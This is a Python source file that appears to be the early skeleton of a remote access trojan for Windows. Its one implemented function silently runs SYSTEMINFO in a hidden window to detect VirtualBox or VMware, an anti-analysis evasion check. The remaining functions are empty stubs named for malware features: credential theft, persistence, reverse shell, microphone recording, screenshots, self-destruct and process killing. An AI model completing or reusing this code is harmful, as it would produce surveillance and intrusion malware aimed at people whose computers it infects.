
import subprocess as sp
import re


def autoPersistent():
    pass


def isVM():
    rules = ['Virtualbox', 'vmbox', 'vmware']
    command = sp.Popen("SYSTEMINFO | findstr \"System Info\"",
                       stderr = sp.PIPE,
                       stdin = sp.DEVNULL,
                       stdout = sp.PIPE,
                       shell = True,
                       text = True,
                       creationflags = 0x08000000)
    
    out, err = command.communicate()
    command.wait()
    
    for rule in rules:
        if re.search(rule, out, re.IGNORECASE):
            return True
    return False    


def isAdmin():
    pass


def getIP():
    pass


def getBits():
    pass


def getUsername():
    pass


def getOS():
    pass


def getCPU():
    pass


def getHostname():
    pass


def createConfig():
    pass


def id():
    pass


def cd(path):
    pass


def process():
    pass


def upload(url, name):
    pass


def screenshot():
    pass


def webshot():
    pass


def creds():
    pass


def persistent():
    pass


def cmd(command):
    pass


def selfdestruct():
    pass


def location():
    pass


def revshell(ip, port):
    pass


def recordmic(seconds):
    pass


def wallpaper(path):
    pass


def killproc(pid):
    pass

